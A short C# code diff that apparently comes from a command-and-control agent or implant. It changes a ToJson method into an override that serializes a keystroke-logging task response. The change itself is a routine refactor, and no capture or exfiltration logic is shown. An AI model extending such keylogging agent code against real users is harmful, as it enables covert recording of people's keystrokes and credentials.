@@ -15,7 +15,7 @@ namespace Agent.Models
                 keylog.keystrokes = keylog.builder.ToString();
             }
         }
-        public string ToJson()
+        public override string ToJson()
         {
             return JsonSerializer.Serialize(this, KeystrokesResponseJsonContext.Default.KeyPressTaskResponse);
         }
